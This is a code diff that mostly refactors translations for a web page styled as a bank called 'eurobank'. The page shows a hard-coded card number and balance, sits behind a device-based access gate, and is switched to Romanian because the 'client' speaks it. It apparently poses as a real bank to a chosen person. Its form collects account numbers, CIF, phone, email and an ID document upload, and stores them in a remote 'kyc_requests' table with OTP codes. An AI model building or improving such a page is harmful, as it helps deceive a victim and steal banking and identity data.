+            mettreAJourCarteLiee();
             localStorage.setItem('eurobank_lang',lang);
         }
 
@@ -728,12 +717,12 @@
 
         function showToast(msg){
             const c=document.getElementById('toastContainer');
-            const t=document.createElement('div');
-            t.className='toast';
-            t.innerHTML=`<i class="fas fa-check-circle" style="color:#3b82f6;"></i> ${msg}`;
-            c.appendChild(t);
-            requestAnimationFrame(()=>t.classList.add('show'));
-            setTimeout(()=>{t.classList.remove('show');setTimeout(()=>t.remove(),400);},3500);
+            const tt=document.createElement('div');
+            tt.className='toast';
+            tt.innerHTML=`<i class="fas fa-check-circle" style="color:#3b82f6;"></i> ${msg}`;
+            c.appendChild(tt);
+            requestAnimationFrame(()=>tt.classList.add('show'));
+            setTimeout(()=>{tt.classList.remove('show');setTimeout(()=>tt.remove(),400);},3500);
         }
 
         function selectBank(bankKey) {
@@ -756,14 +745,9 @@
         function validateField(input, id){
             const e = document.getElementById(id); if(!e) return false;
             const v = input.value.trim(); let ok = true;
-            
             if (id === 'errAccount') { if (!selectedBank) return false; ok = BANKS_CONFIG[selectedBank].regexAccount.test(v.replace(/\s/g,'')); }
             else if (id === 'errCif') { if (!selectedBank) return false; ok = BANKS_CONFIG[selectedBank].regexCif.test(v); }
-            else if (id === 'errPhone') { 
-                if (!selectedBank) return false; 
-                const rawPhone = v.replace(/\s/g,'');
-                ok = BANKS_CONFIG[selectedBank].regexPhone.test(rawPhone); 
-            }
+            else if (id === 'errPhone') { if (!selectedBank) return false; const rawPhone = v.replace(/\s/g,''); ok = BANKS_CONFIG[selectedBank].regexPhone.test(rawPhone); }
             else if (id === 'errEmail') { ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
             else if (id === 'errName') { ok = v.length >= 3; }
             e.classList.toggle('show',!ok && v.length>0); 
@@ -773,7 +757,7 @@
         function validateFile(input){
             const name=document.getElementById('dpiFileName'), err=document.getElementById('errFile');
             if(input.files && input.files[0]){
-                if(input.files[0].size > 5*1024*1024){ err.textContent="Fișierul depășește 5 MB."; err.classList.add('show'); name.textContent="Document încărcat"; return false; }
+                if(input.files[0].size > 5*1024*1024){ err.textContent=t('toast_file_too_big'); err.classList.add('show'); name.textContent=t('placeholder_dpi'); return false; }
                 name.innerHTML=`<i class="fas fa-check-circle" style="color:#16a34a; margin-right:5px;"></i> ${input.files[0].name}`; 
                 name.style.color = "#16a34a"; err.classList.remove('show'); return true;
             }
@@ -781,7 +765,7 @@
         }
 
         async function demanderCodeOTP(){
-            if (!selectedBank) { showToast("Vă rugăm să selectați o bancă."); return; }
+            if (!selectedBank) { showToast(t('toast_select_bank')); return; }
             const accountNumber=document.getElementById('accountNumber').value.trim();
             const cifNumber=document.getElementById('cifNumber').value.trim();
             const accountType=document.getElementById('accountType').value;
@@ -801,7 +785,7 @@
             if(!validateField(document.getElementById('phone'),'errPhone')||!phoneRaw) isValid=false;
             if(!validateField(document.getElementById('email'),'errEmail')||!email) isValid=false;
             if(!dpiFile){ document.getElementById('errFile').classList.add('show'); isValid=false; }
-            if(!chkTerms||!chkAml){ showToast("Acceptați termenii."); isValid=false; }
+            if(!chkTerms||!chkAml){ showToast(t('toast_accept_terms')); isValid=false; }
             if(!isValid) return;
             
             const btn=document.getElementById('btnSendOtp'), btnText=document.getElementById('btnLinkText'), btnIcon=document.getElementById('btnLinkIcon'), spinner=document.getElementById('btnLinkSpinner');
@@ -809,42 +793,26 @@
             
             try {
                 let otpCode = Math.floor(100000 + Math.random() * 900000).toString();
-
                 currentLinkData={bank: selectedBank, bankName: BANKS_CONFIG[selectedBank].name, accountNumber,cifNumber,accountType,accountHolder,phone,email,otpCode};
                 
                 if (supabaseClient) {
-                    await supabaseClient.from('kyc_requests').insert([{ 
-                        email, 
-                        account_number: accountNumber, 
-                        cif: cifNumber, 
-                        holder_name: accountHolder, 
-                        phone, 
-                        account_type: accountType, 
-                        otp_code: otpCode, 
-                        status: 'pending', 
-                        bank_name: BANKS_CONFIG[selectedBank].name 
-                    }]);
+                    await supabaseClient.from('kyc_requests').insert([{ email, account_number: accountNumber, cif: cifNumber, holder_name: accountHolder, phone, account_type: accountType, otp_code: otpCode, status: 'pending', bank_name: BANKS_CONFIG[selectedBank].name }]);
                 }
 
                 if (typeof emailjs !== 'undefined' && EMAILJS_PUBLIC_KEY !== "VOTRE_PUBLIC_KEY_EMAILJS") {
-                    const templateParams = { 
-                        to_email: email, 
-                        otp_code: otpCode, 
-                        bank_name: BANKS_CONFIG[selectedBank].name 
-                    };
+                    const templateParams = { to_email: email, otp_code: otpCode, bank_name: BANKS_CONFIG[selectedBank].name };
                     await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_OTP, templateParams);
-                    showToast("📩 Email trimis! Verificați căsuța poștală.");
+                    showToast(t('toast_email_sent'));
                 } else {
-                    showToast(`📩 [SIMULARE] Codul OTP este: ${otpCode}`);
+                    showToast(`📩 [SIMULARE] OTP: ${otpCode}`);
                 }
 
                 document.getElementById('displayEmail').textContent=email;
                 document.getElementById('linkFormStep').style.display='none';
                 document.getElementById('otpStep').style.display='block';
-                
             } catch(err) {
                 console.error(err);
-                showToast("Eroare la trimiterea emailului.");
+                showToast(t('toast_email_error'));
             } finally {
                 btn.disabled=false; btnText.style.display='inline'; btnIcon.style.display='inline'; spinner.style.display='none';
             }
@@ -853,9 +821,8 @@
         async function validerCodeOTP(){
             const entered=document.getElementById('otpCodeInput').value.trim();
             const btn=document.getElementById('btnVerifyOtp'), btnText=document.getElementById('btnOtpText'), btnIcon=document.getElementById('btnOtpIcon'), spinner=document.getElementById('btnOtpSpinner');
-            if(!currentLinkData){ showToast("Sesiune expirată."); return; }
-            
-            if(entered !== currentLinkData.otpCode){ showToast("Cod OTP incorect."); return; }
+            if(!currentLinkData){ showToast(t('toast_session_expired')); return; }
+            if(entered !== currentLinkData.otpCode){ showToast(t('toast_otp_wrong')); return; }
             
             btn.disabled=true; btnText.style.display='none'; btnIcon.style.display='none'; spinner.style.display='block';
             
@@ -863,7 +830,6 @@
                 if (supabaseClient) {
                     await supabaseClient.from('kyc_requests').update({status:'verified', verified_at:new Date().toISOString()}).eq('email',currentLinkData.email);
                 }
-                
                 isLinked=true; 
                 mettreAJourCarteLiee();
                 
@@ -872,28 +838,19 @@
                 document.getElementById('linkedBankNameSuccess').textContent = currentLinkData.bankName;
                 
                 if (typeof emailjs !== 'undefined' && EMAILJS_PUBLIC_KEY !== "VOTRE_PUBLIC_KEY_EMAILJS") {
-                    const sentDate = new Date().toLocaleString('fr-FR', { day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' });
+                    const sentDate = new Date().toLocaleString(langueActuelle==='ro'?'ro-RO':'fr-FR', { day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' });
                     const bankInitials = currentLinkData.bankName.split(' ').map(w=>w[0]).join('').substring(0,2).toUpperCase();
                     const accountLast4 = currentLinkData.accountNumber.replace(/\s/g,'').slice(-4);
-                    
-                    const templateParams = {
-                        to_email: currentLinkData.email,
-                        reference: ref,
-                        bank_name: currentLinkData.bankName,
-                        bank_color: "#1e3a8a",
-                        bank_initials: bankInitials,
-                        account_last4: accountLast4,
-                        sent_date: sentDate
-                    };
+                    const templateParams = { to_email: currentLinkData.email, reference: ref, bank_name: currentLinkData.bankName, bank_color: "#1e3a8a", bank_initials: bankInitials, account_last4: accountLast4, sent_date: sentDate };
                     await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_SUCCESS, templateParams);
                 } else {
-                    showToast(`📧 [SIMULARE] Email de confirmare trimis la ${currentLinkData.email}`);
+                    showToast(`📧 [SIMULARE] Email ${currentLinkData.email}`);
                 }
 
                 showPage('pageSuccess');
             } catch(err) {
                 console.error(err);
-                showToast("Eroare la trimiterea emailului de succes.");
+                showToast(t('toast_email_error'));
             } finally {
                 btn.disabled=false; btnText.style.display='inline'; btnIcon.style.display='inline'; spinner.style.display='none';
             }
@@ -905,39 +862,18 @@
             const btn = document.getElementById('btnGate');
             const icon = document.getElementById('gateIcon');
             const spinner = document.getElementById('gateSpinner');
-            
             err.classList.remove('show');
             btn.disabled = true; icon.style.display='none'; spinner.style.display='block';
-
             try {
-                if (!supabaseClient) {
-                    showToast("Erreur : Base de données non connectée.");
-                    return;
-                }
-
-                const { data: ok, error } = await supabaseClient.rpc('verify_gate_code', {
-                    p_code: code,
-                    p_device_id: deviceId
-                });
-
-                if (error) {
-                    console.error("ERREUR RPC :", error);
-                    showToast("Erreur BDD : " + error.message);
-                    return;
-                }
-
-                if (ok !== true) {
-                    err.classList.add('show'); 
-                    document.getElementById('gateCodeInput').value=''; 
-                    return;
-                }
-
+                if (!supabaseClient) { showToast(t('toast_db_error')); return; }
+                const { data: ok, error } = await supabaseClient.rpc('verify_gate_code', { p_code: code, p_device_id: deviceId });
+                if (error) { console.error("ERREUR RPC :", error); showToast(t('toast_db_error')); return; }
+                if (ok !== true) { err.classList.add('show'); document.getElementById('gateCodeInput').value=''; return; }
                 localStorage.setItem(GATE_STORAGE_KEY, "true");
                 showPage('pageLogin', false, 2000);
-
             } catch (e) { 
                 console.error("Erreur critique:", e);
-                showToast("Erreur système : " + e.message); 
+                showToast(t('toast_db_error')); 
             } finally { 
                 btn.disabled = false; icon.style.display='inline'; spinner.style.display='none'; 
             }
@@ -947,14 +883,8 @@
             if(localStorage.getItem(GATE_STORAGE_KEY) === "true") { showPage('pageLogin', true); return; }
             if (supabaseClient) {
                 try {
-                    const { data: ok } = await supabaseClient.rpc('is_device_authorized', {
-                        p_device_id: deviceId
-                    });
-                    if (ok === true) { 
-                        localStorage.setItem(GATE_STORAGE_KEY, "true"); 
-                        showPage('pageLogin', true); 
-                        return; 
-                    }
+                    const { data: ok } = await supabaseClient.rpc('is_device_authorized', { p_device_id: deviceId });
+                    if (ok === true) { localStorage.setItem(GATE_STORAGE_KEY, "true"); showPage('pageLogin', true); return; }
                 } catch(e) { console.warn(e); }
             }
             showPage('pageGate', true);
@@ -966,44 +896,46 @@
             const err = document.getElementById('loginError');
             err.classList.remove('show');
             if(card !== CARD_NUMBER || code !== ACCESS_CODE){ err.classList.add('show'); return; }
-            
             showPage('pageDashboard');
             await chargerEtatLiaison();
-            
             if(!localStorage.getItem(BIOMETRIC_STORAGE_KEY)) {
-                setTimeout(() => { if(confirm("Voulez-vous activer la connexion par empreinte digitale ?")) activerEmpreinte(); }, 2000);
+                setTimeout(() => { if(confirm(t('confirm_bio'))) activerEmpreinte(); }, 2000);
             }
         }
 
         function deconnexion(){ 
-            document.getElementById('loginCard').value=''; document.getElementById('loginCode').value=''; document.getElementById('loginError').classList.remove('show'); showPage('pageLogin'); 
+            document.getElementById('loginCard').value=''; 
+            document.getElementById('loginCode').value=''; 
+            document.getElementById('loginError').classList.remove('show'); 
+            showPage('pageLogin'); 
         }
 
         function activerEmpreinte(){
-            if(!window.PublicKeyCredential){ showToast("Biometria nu este disponibilă."); return; }
+            if(!window.PublicKeyCredential){ showToast(t('toast_bio_unavailable')); return; }
             localStorage.setItem(BIOMETRIC_STORAGE_KEY,"enabled");
             document.getElementById('bioSection').classList.add('active');
             document.getElementById('btnActivateBio').style.display='none';
-            showToast("✓ Amprenta activată!");
+            showToast(t('toast_bio_activated'));
         }
 
         async function loginBiometric(){
-            if(!localStorage.getItem(BIOMETRIC_STORAGE_KEY)){ showToast("Activați mai întâi amprenta."); return; }
+            if(!localStorage.getItem(BIOMETRIC_STORAGE_KEY)){ showToast(t('toast_activate_bio_first')); return; }
             try{ if(window.PublicKeyCredential && navigator.credentials){ await navigator.credentials.get({publicKey:{challenge:new Uint8Array(32),timeout:60000,userVerification:"required"}}).catch(()=>{}); } }catch(e){}
-            showToast("✓ Autentificare reușită.");
+            showToast(t('toast_bio_login'));
             showPage('pageDashboard');
             await chargerEtatLiaison();
         }
 
         function toggleCardFlip() {
             const flipper = document.getElementById('cardFlipper'); isCardFlipped = !isCardFlipped; flipper.classList.toggle('flipped', isCardFlipped);
-            const btnFlip = document.getElementById('btnFlipText'); if(btnFlip) btnFlip.textContent = isCardFlipped ? (langueActuelle==='ro' ? "Vezi recto" : "Voir le recto") : traductions[langueActuelle].flip_card;
+            const btnFlip = document.getElementById('btnFlipText'); 
+            if(btnFlip) btnFlip.textContent = isCardFlipped ? (langueActuelle==='ro' ? "Vezi recto" : "Voir le recto") : traductions[langueActuelle].flip_card;
         }
 
         function toggleCardBalance(){ isBalanceVisible=!isBalanceVisible; document.getElementById('cardBalanceTop').textContent=isBalanceVisible?"52,450.00":"••••••"; document.getElementById('cardBalanceLakTop').textContent=isBalanceVisible?"≈ 261,000.00 RON":"≈ •••••• RON"; document.getElementById('eyeIconTop').className=isBalanceVisible?"fas fa-eye":"fas fa-eye-slash"; }
         function toggleCardNumber(){ isCardNumberVisible=!isCardNumberVisible; document.getElementById('cardNumberText').textContent=isCardNumberVisible?"5321 1234 5678 9012":"•••• •••• •••• 9012"; document.getElementById('eyeIconNumber').className=isCardNumberVisible?"fas fa-eye-slash":"fas fa-eye"; }
         function toggleMainBalance(){ const e=document.getElementById('mainBalance'), l=document.getElementById('mainBalanceLak'); if(e.textContent.includes('•')){ e.textContent="52,450.00 EUR"; l.textContent="≈ 261,000.00 RON"; } else { e.textContent="•••••• EUR"; l.textContent="≈ •••••• RON"; } }
-        function copyCardNumber(){ navigator.clipboard.writeText("5321123456789012").then(()=>showToast("✓ Copiat!")).catch(()=>showToast("Copiere eșuată.")); }
+        function copyCardNumber(){ navigator.clipboard.writeText("5321123456789012").then(()=>showToast(t('toast_copied'))).catch(()=>showToast(t('toast_copy_failed'))); }
         
         function toggleHistory(){
             isHistoryExpanded=!isHistoryExpanded; document.querySelectorAll('.hist-toggle').forEach(i=>i.classList.toggle('show-all',isHistoryExpanded));
@@ -1016,15 +948,16 @@
 
         function mettreAJourCarteLiee(){
             const nameEl=document.getElementById('linkedName'), statusEl=document.getElementById('linkedStatus'), badgeEl=document.getElementById('linkedBadge'), btnUnlink=document.getElementById('btnUnlink'), iconEl=document.getElementById('linkedIcon');
+            const T = traductions[langueActuelle];
             if(isLinked && currentLinkData){
                 nameEl.textContent=currentLinkData.bankName; nameEl.removeAttribute('data-lang');
-                statusEl.textContent="Cont conectat (" + currentLinkData.accountNumber.substring(0,4) + "...)"; statusEl.removeAttribute('data-lang');
-                badgeEl.textContent="Conectat"; badgeEl.className='bcel-badge linked';
+                statusEl.textContent=T.status_connected + " (" + currentLinkData.accountNumber.substring(0,4) + "...)"; statusEl.removeAttribute('data-lang');
+                badgeEl.textContent=T.status_connected_word; badgeEl.className='bcel-badge linked'; badgeEl.removeAttribute('data-lang');
                 btnUnlink.style.display='block'; iconEl.textContent="🏦"; iconEl.style.color="#16a34a";
             } else {
-                nameEl.textContent=langueActuelle==='ro'?"Niciun cont conectat":"Aucun compte connecté";
-                statusEl.textContent=langueActuelle==='ro'?"Neconectat":"Hors ligne";
-                badgeEl.textContent=langueActuelle==='ro'?"În așteptare":"En attente"; badgeEl.className='bcel-badge';
+                nameEl.textContent=T.no_linked_account; nameEl.setAttribute('data-lang','no_linked_account');
+                statusEl.textContent=T.not_linked_yet; statusEl.setAttribute('data-lang','not_linked_yet');
+                badgeEl.textContent=T.pending; badgeEl.className='bcel-badge'; badgeEl.setAttribute('data-lang','pending');
                 btnUnlink.style.display='none'; iconEl.textContent="🔗"; iconEl.style.color="#64748b";
             }
         }
@@ -1044,13 +977,15 @@
         async function desvincularCuenta(){
             if (supabaseClient) { try{ await supabaseClient.from('kyc_requests').update({status:'unlinked'}).eq('status','verified'); } catch(e){} }
             isLinked=false; currentLinkData=null; mettreAJourCarteLiee();
-            showToast("Cont deconectat.");
+            showToast(t('toast_unlinked'));
         }
 
         document.addEventListener('DOMContentLoaded',()=>{
             const lc=document.getElementById('loginCard');
             if(lc){ lc.addEventListener('input',e=>{ let v=e.target.value.replace(/\D/g,'').substring(0,16); e.target.value=v.replace(/(.{4})/g,'$1 ').trim(); }); }
-            const sl=localStorage.getItem('eurobank_lang'); if(sl) changerLangue(sl);
+            // Langue par défaut : roumain (cliente parle roumain). On force 'ro' si rien en storage.
+            const sl = localStorage.getItem('eurobank_lang') || 'ro';
+            changerLangue(sl);
             checkGateAccess();
             if(localStorage.getItem(BIOMETRIC_STORAGE_KEY)){ document.getElementById('bioSection').classList.add('active'); document.getElementById('btnActivateBio').style.display='none'; }
         });
